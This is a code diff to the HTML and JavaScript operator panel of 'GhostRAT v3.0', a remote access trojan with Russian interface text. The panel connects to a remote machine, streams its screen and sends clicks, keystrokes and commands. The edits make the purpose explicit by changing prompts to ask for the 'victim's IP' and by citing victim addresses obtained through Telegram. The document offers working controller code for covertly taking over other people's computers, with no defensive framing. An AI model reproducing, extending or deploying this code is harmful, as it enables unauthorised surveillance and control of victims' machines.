@@ -13,8 +13,7 @@
         .config button{padding:8px 16px;background:#00ff41;color:#0a0a0a;border:none;border-radius:4px;font-weight:bold;cursor:pointer}
         .config button:hover{background:#00cc33}
         .status{display:flex;flex-wrap:wrap;gap:15px;justify-content:center;padding:8px;font-size:13px;background:#0a0a0a;border-radius:4px;margin-bottom:10px}
-        .status .online{color:#44ff44}
-        .status .offline{color:#ff4444}
+        .status .online{color:#44ff44}.status .offline{color:#ff4444}
         #canvasWrap{position:relative;border:2px solid #00ff41;border-radius:8px;background:#000;max-width:100%;margin:0 auto}
         #screenCanvas{display:block;width:100%;height:auto;cursor:crosshair}
         #loading{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#00ff41;font-size:24px;animation:pulse 1.5s infinite}
@@ -26,13 +25,8 @@
         .controls button.danger:hover{background:#cc0000}
         .controls input{flex:1;min-width:120px}
         .log{max-height:120px;overflow-y:auto;background:#0a0a0a;border:1px solid #1a3a1a;border-radius:4px;padding:5px 10px;margin-top:10px;font-size:11px;color:#666}
-        .log .cmd{color:#00ff41}
-        .log .resp{color:#44aaff}
-        .log .err{color:#ff4444}
-        .log .info{color:#888}
-        ::-webkit-scrollbar{width:4px}
-        ::-webkit-scrollbar-track{background:#0a0a0a}
-        ::-webkit-scrollbar-thumb{background:#00ff41;border-radius:2px}
+        .log .cmd{color:#00ff41}.log .resp{color:#44aaff}.log .err{color:#ff4444}.log .info{color:#888}
+        ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:#0a0a0a}::-webkit-scrollbar-thumb{background:#00ff41;border-radius:2px}
         .footer{text-align:center;margin-top:15px;font-size:11px;color:#333}
     </style>
 </head>
@@ -42,7 +36,7 @@
 
 <div class="config">
     <span style="color:#00ff41;font-size:14px;">СЕРВЕР:</span>
-    <input type="text" id="serverInput" value="localhost:8080" placeholder="IP:PORT">
+    <input type="text" id="serverInput" value="" placeholder="185.123.45.67:8080">
     <button id="connectBtn">🔗 ПОДКЛЮЧИТЬ</button>
     <span id="connStatus" style="font-size:14px;">● <span id="connText">отключен</span></span>
 </div>
@@ -77,17 +71,17 @@
 </div>
 
 <div class="log" id="log">
-    <div class="info">[SYSTEM] Готов. Укажи IP сервера и нажми ПОДКЛЮЧИТЬ.</div>
+    <div class="info">[SYSTEM] Готов. Введи IP жертвы и нажми ПОДКЛЮЧИТЬ.</div>
 </div>
 
 <div class="footer">GhostRAT v3.0 | @zazayaga</div>
 
 <script>
 // ================================================================
-// ВЕСЬ КОД РАБОТАЕТ ЧЕРЕЗ УКАЗАННЫЙ СЕРВЕР (IP:PORT)
+//  ПОЛНЫЙ КЛИЕНТ ДЛЯ УПРАВЛЕНИЯ
 // ================================================================
 
-let serverUrl = 'http://localhost:8080';
+let serverUrl = '';
 let streaming = false;
 let intervalId = null;
 let frameCount = 0;
@@ -115,7 +109,7 @@ function log(text, cls = 'info') {
     if (logDiv.children.length > 150) logDiv.removeChild(logDiv.firstChild);
 }
 
-// ===== ОТПРАВКА КОМАНДЫ НА СЕРВЕР =====
+// ===== ОТПРАВКА КОМАНДЫ =====
 function sendCommand(cmd, cb = null) {
     if (!isConnected) {
         log('✗ Сначала подключись к серверу!', 'err');
@@ -163,14 +157,13 @@ function setConnectionStatus(online) {
     }
 }
 
-// ===== ПОДКЛЮЧЕНИЕ К СЕРВЕРУ =====
+// ===== ПОДКЛЮЧЕНИЕ =====
 function connectToServer() {
     const input = document.getElementById('serverInput').value.trim();
     if (!input) {
-        log('✗ Введи IP:PORT (например, 192.168.1.100:8080)', 'err');
+        log('✗ Введи IP:PORT (например, 185.123.45.67:8080)', 'err');
         return;
     }
-    // Добавляем http:// если нет
     let url = input;
     if (!url.startsWith('http://') && !url.startsWith('https://')) {
         url = 'http://' + url;
@@ -178,7 +171,7 @@ function connectToServer() {
     serverUrl = url;
     log('🔗 Подключение к ' + serverUrl + '...', 'info');
 
-    // Проверяем доступность
+    // Проверяем доступность сервера
     fetch(serverUrl + '/api', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -188,7 +181,7 @@ function connectToServer() {
     .then(data => {
         setConnectionStatus(true);
         log('✅ Подключено к ' + serverUrl, 'resp');
-        // Автоматически запускаем стрим
+        localStorage.setItem('ghostrat_server', input);
         setTimeout(startStream, 300);
     })
     .catch(err => {
@@ -250,7 +243,7 @@ function fetchFrame() {
     });
 }
 
-// ===== УПРАВЛЕНИЕ СТРИМОМ =====
+// ===== СТРИМ =====
 function startStream() {
     if (streaming) return;
     if (!isConnected) {
@@ -281,7 +274,7 @@ function stopStream() {
     log('⏹ СТРИМ ОСТАНОВЛЕН', 'info');
 }
 
-// ===== ОТПРАВКА КЛИКА =====
+// ===== КЛИКИ =====
 function sendClick(x, y, btn = 'left', count = 1) {
     if (!streaming) { log('✗ Запусти стрим', 'err'); return; }
     if (canvasW === 0 || canvasH === 0) return;
@@ -292,7 +285,7 @@ function sendClick(x, y, btn = 'left', count = 1) {
     log('🖱️ ' + btn + ' (' + rx + ',' + ry + ')', 'cmd');
 }
 
-// ===== СОБЫТИЯ МЫШИ НА КАНВАСЕ =====
+// ===== СОБЫТИЯ МЫШИ =====
 canvas.addEventListener('click', function(e) {
     const r = canvas.getBoundingClientRect();
     sendClick(e.clientX - r.left, e.clientY - r.top, 'left', 1);
@@ -373,7 +366,6 @@ document.getElementById('cmdInput').addEventListener('keydown', function(e) {
     if (e.key === 'Enter') document.getElementById('sendBtn').click();
 });
 
-// ===== КЛАВИША ПРОБЕЛ =====
 document.addEventListener('keydown', function(e) {
     if (e.key === ' ' && e.target.tagName !== 'INPUT') {
         e.preventDefault();
@@ -381,23 +373,15 @@ document.addEventListener('keydown', function(e) {
     }
 });
 
-// ===== АВТОПОДКЛЮЧЕНИЕ =====
+// ===== АВТОЗАГРУЗКА =====
 setConnectionStatus(false);
 log('[SYSTEM] GhostRAT v3.0 загружен', 'info');
-log('[SYSTEM] Введи IP сервера (например, 192.168.1.100:8080) и нажми ПОДКЛЮЧИТЬ', 'info');
-log('[SYSTEM] Или просто нажми ENTER в поле ввода', 'info');
+log('[SYSTEM] Введи IP жертвы (из Telegram) и нажми ПОДКЛЮЧИТЬ', 'info');
 
-// Если есть сохранённый сервер в localStorage - подгружаем
 const savedServer = localStorage.getItem('ghostrat_server');
 if (savedServer) {
     document.getElementById('serverInput').value = savedServer;
-    setTimeout(connectToServer, 500);
 }
-
-// Сохраняем сервер при подключении
-document.getElementById('connectBtn').addEventListener('click', function() {
-    localStorage.setItem('ghostrat_server', document.getElementById('serverInput').value.trim());
-});
 </script>
 </body>
 </html>
